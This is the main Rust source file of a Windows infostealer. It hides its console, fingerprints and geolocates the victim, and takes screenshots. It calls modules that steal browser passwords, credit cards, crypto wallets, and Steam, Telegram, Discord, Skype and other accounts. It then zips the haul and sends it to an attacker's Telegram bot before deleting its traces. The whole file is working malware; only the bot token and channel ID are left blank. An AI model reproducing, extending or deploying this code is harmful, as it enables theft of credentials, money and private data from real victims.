#![windows_subsystem = "windows"] // Hide the Console

mod chrome_grabber;
mod messengers;
mod other_grabber;
mod wallet_grabber;

extern crate serde;

use screenshots::*;

use std::io::{prelude::*, Seek, Write};
use std::{fs::File, iter::Iterator, path::Path};
use sysinfo::{NetworkExt, ProcessExt, System, SystemExt};
use tbot::{markup::*, types::input_file::Document, types::parameters::Text as ParseMode, Bot};
use walkdir::{DirEntry, WalkDir};
use zip::{result::ZipError, write::FileOptions};
type ChannelId = tbot::types::chat::Id;
use ipgeolocate::{Locator, Service};
use std::os::windows::fs::OpenOptionsExt;
use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;
use wmi::{COMLibrary, WMIConnection};

const BOT_TOKEN: &str = "";
const CHANNEL_ID: i64 = -0;
const MUTEX: bool = false;

static mut PASSWORDS: i64 = 0;
static mut WALLETS: i64 = 0;
static mut FILES: i64 = 0;
static mut CREDIT_CARDS: i64 = 0;

#[tokio::main]
async fn main() {
    let app_data = std::env::var("LOCALAPPDATA").ok().unwrap();

    
    
    
    let string_path: &str = &format!("{}\\logsxc\\", app_data);
    let mutex_file = format!("{}\\dimp.sts", app_data);

    if MUTEX {
        if std::path::Path::new(&mutex_file).exists() || std::path::Path::new(&string_path).exists()
        {
            std::process::exit(0); // Dont resend any already sent log.
        }
    }

    let _ = std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .attributes(FILE_ATTRIBUTE_HIDDEN)
        .open(mutex_file);

    std::fs::create_dir(string_path).unwrap(); // Crash if we dont have permission to create the directory.
    
    let channel = ChannelId::from(CHANNEL_ID);
    let bot = Bot::new(BOT_TOKEN.to_string());
    let language = format!("{:?}", whoami::lang().collect::<Vec<String>>());
    let mut sys = System::new_all();
    sys.refresh_all();

    let message = bold((
        format!(
            "**Information From ({} / {} )**\n",
            my_internet_ip::get().unwrap().to_string(),
            whoami::lang().collect::<Vec<String>>().first().unwrap()
        ),
        format!("User: {}\n", whoami::username()),
        format!("Installed Languages: {} \n", language),
        format!(
            "Operating System: {} {}\n",
            sys.name().unwrap(),
            sys.os_version().unwrap()
        ),
        format!(
            "Used/Installed RAM: {} / {} GB \n",
            sys.used_memory() / 1024 / 1024,
            sys.total_memory() / 1024 / 1024
        ),
        format!("Cores available: {} \n", sys.cpus().len()),
    ));

    let city = match Locator::get(&my_internet_ip::get().unwrap().to_string(), Service::IpApi).await
    {
        Ok(ip) => format!(
            "Country: {}\nCity: {}\nTimezone:{}\nCordinates:{} - {}",
            ip.country, ip.city, ip.timezone, ip.latitude, ip.longitude
        ),
        Err(error) => format!("Error: {}", error),
    };
    
    let mut i = 1;
    for screen in Screen::all() {
        let image = screen.capture().unwrap();
        let buffer = image.buffer();
        std::fs::write(format!("{}\\screen-{}.png", string_path, i), &buffer).unwrap(); // make it with i because the library is stupid and cant do it on its own.
        i += 1;
    }
    let _call_result = bot
        .send_document(
            channel,
            Document::with_bytes(
                "data.png",
                &std::fs::read(format!("{}\\screen-1.png", string_path)).unwrap(),
            )
            .caption(ParseMode::with_markdown_v2(
                &markdown_v2(message).to_string(),
            )),
        )
        .call()
        .await;
        
        if let Err(_err) = _call_result {
        std::fs::File::create(format!("{}\\error.txt", string_path))
        .unwrap()
        .write_all(_err.to_string().as_bytes())
        .unwrap();
        std::process::exit(0);
    }

    let mut sysinfo = vec![];
    sysinfo.push(format!("Username: {}", whoami::username()));
    sysinfo.push(format!("Computer name: {}", whoami::devicename()));
    sysinfo.push(format!(
        "OS: {}",
        whoami::distro_os().into_string().unwrap()
    ));
    sysinfo.push(format!("Language: {}", language));
    sysinfo.push(format!("Hostname: {}", whoami::hostname()));
    sysinfo.push(format!(
        "IP: {}",
        my_internet_ip::get().unwrap().to_string()
    ));
    sysinfo.push(city);
    
    let hardware = get_hardware();
    if hardware.is_ok() {
        sysinfo.push(format!("{}", hardware.unwrap()));
    }
    
    std::fs::File::create(format!("{}\\info.txt", string_path))
    .unwrap()
    .write_all(sysinfo.join("\n").as_bytes())
    .unwrap();
    
    let mut system_info = vec![];
    
    system_info.push("=> networks:".to_string());
    for (interface_name, data) in sys.networks() {
        let output = format!(
            "{}: {}/{} B",
            interface_name,
            data.received(),
            data.transmitted()
        );
        system_info.push(output);
    }

    system_info.push("=> system:".to_string());
    system_info.push(format!("total memory: {} KB", sys.total_memory()));
    system_info.push(format!("used memory : {} KB", sys.used_memory()));
    system_info.push(format!("total swap  : {} KB", sys.total_swap()));
    system_info.push(format!("used swap   : {} KB", sys.used_swap()));
    system_info.push(format!("NB CPUs: {}", sys.cpus().len()));
    
    system_info.push("=> Processes:".to_string());
    system_info.push("=> PID, Name".to_string());
    for (pid, process) in sys.processes() {
        system_info.push(format!("[{}] {}", pid, process.name()));
    }
    std::fs::File::create(format!("{}\\system_info.txt", string_path))
        .unwrap()
        .write_all(system_info.join("\n").as_bytes())
        .unwrap();
        
    //TODO Make A Method in each Package.
    chrome_grabber::main::chrome_main();
    wallet_grabber::wallets::grab_cold_wallets();
    wallet_grabber::wallets::steal_browser_wallets();
    
    other_grabber::sensitive_data::grab_data();
    other_grabber::steam::steal_steam_account();
    other_grabber::telegram::steal_telegram();
    other_grabber::sensitive_data::grab_data();
    other_grabber::uplay::steal_uplay();

    messengers::discord::steal_discord();
    messengers::element::steal_element();
    messengers::icq::steal_icq();
    messengers::skype::steal_skype();

    unsafe {
        let msg_edit = bold((
            format!(
                "**New Log From ({} / {} )**\n",
                my_internet_ip::get().unwrap().to_string(),
                whoami::lang().collect::<Vec<String>>().first().unwrap()
            ),
            format!("User: {}\n", whoami::username()),
            format!("Installed Languages: {} \n", language),
            format!(
                "Operating System: {} {}\n",
                sys.name().unwrap(),
                sys.os_version().unwrap()
            ),
            format!(
                "Used/Installed RAM: {} / {} GB \n",
                sys.used_memory() / 1024 / 1024,
                sys.total_memory() / 1024 / 1024
            ),
            format!("Cores available: {} \n", sys.cpus().len()),
            match PASSWORDS > 1 {
                true => format!("Passwords: ✅ {}\n", PASSWORDS),
                false => format!("Passwords: ❌\n"),
            },
            match WALLETS > 1 {
                true => format!("Wallets: ✅ {}\n", WALLETS),
                false => format!("Wallets: ❌\n"),
            },
            match FILES > 1 {
                true => format!("Files: ✅ {}\n", FILES),
                false => format!("Files: ❌\n"),
            },
            match CREDIT_CARDS > 1 {
                true => format!("Credit Cards: ✅ {}\n", CREDIT_CARDS),
                false => format!("Credit Cards: ❌\n"),
            },
        ));

        zip_file(
            string_path,
            &format!("{}\\out.zip", std::env::var("TEMP").unwrap()),
            zip::CompressionMethod::Deflated,
        )
        .unwrap();
        let mut log_accounts =
            std::fs::File::open(format!("{}\\out.zip", std::env::var("TEMP").unwrap())).unwrap();

        let mut log_buffer = Vec::new();
        log_accounts.read_to_end(&mut log_buffer).unwrap();
        let _data_document: Document = Document::with_bytes("out.zip", &log_buffer);

        let _ = bot
            .delete_message(
                ChannelId::from(CHANNEL_ID),
                _call_result.as_ref().unwrap().id,
            )
            .call()
            .await;

        let _call_result = bot
            .send_document(
                ChannelId::from(CHANNEL_ID),
                _data_document.caption(ParseMode::with_markdown_v2(
                    &markdown_v2(msg_edit).to_string(),
                )),
            )
            .call()
            .await;

        if let Err(_err) = _call_result {
            std::fs::File::create(format!("{}\\error.txt", string_path))
                .unwrap()
                .write_all(_err.to_string().as_bytes())
                .unwrap();
            std::process::exit(0);
        }

        std::fs::remove_dir_all(string_path).unwrap();
        std::fs::remove_file(format!("{}\\sensfiles.zip", app_data)).unwrap();
    }
}

fn zip_file(
    src_dir: &str,
    dst_file: &str,
    method: zip::CompressionMethod,
) -> zip::result::ZipResult<()> {
    if !Path::new(src_dir).is_dir() {
        return Err(ZipError::FileNotFound);
    }

    let path = Path::new(dst_file);
    let file = File::create(&path)?;

    let walkdir = WalkDir::new(src_dir);
    let it = walkdir.into_iter();

    zip_dir(&mut it.filter_map(|e| e.ok()), src_dir, file, method)?;

    Ok(())
}

fn zip_dir<T>(
    it: &mut dyn Iterator<Item = DirEntry>,
    prefix: &str,
    writer: T,
    method: zip::CompressionMethod,
) -> zip::result::ZipResult<()>
where
    T: Write + Seek,
{
    let mut zip = zip::ZipWriter::new(writer);
    let options = FileOptions::default()
        .compression_method(method)
        .unix_permissions(0o755);

    let mut buffer = Vec::new();
    for entry in it {
        let path = entry.path();
        let name = path.strip_prefix(Path::new(prefix)).unwrap();

        // Write file or directory explicitly
        // Some unzip tools unzip files with directory paths correctly, some do not!
        if path.is_file() {
            #[allow(deprecated)]
            zip.start_file_from_path(name, options)?;
            let mut f = File::open(path)?;

            f.read_to_end(&mut buffer)?;
            zip.write_all(&*buffer)?;
            buffer.clear();
        } else if !name.as_os_str().is_empty() {
            #[allow(deprecated)]
            zip.add_directory_from_path(name, options)?;
        }
    }
    zip.finish()?;
    Result::Ok(())
}

fn get_hardware() -> Result<String, Box<dyn std::error::Error>> {
    let com_con = COMLibrary::new().unwrap();
    let wmi_con = WMIConnection::new(com_con.into()).unwrap();
    use serde::Deserialize;

    #[allow(non_snake_case, non_camel_case_types)]
    #[derive(Deserialize)]
    struct Win32_Processor {
        Name: String,
    }

    let mut hardware = vec![];

    let results: Vec<Win32_Processor> = wmi_con.query()?;

    for cpu in results {
        hardware.push(format!("{:#?}", cpu.Name));
    }

    #[allow(non_snake_case, non_camel_case_types)]
    #[derive(Deserialize)]
    pub struct Win32_VideoController {
        Caption: String,
        AdapterRAM: i64,
        VideoModeDescription: String,
    }

    let results: Vec<Win32_VideoController> = wmi_con.query()?;

    for video in results {
        hardware.push(format!(
            "{} : {} bytes : {}",
            video.Caption,
            video.AdapterRAM / 1024,
            video.VideoModeDescription
        ));
    }

    return Ok(hardware.join("\n"));
}
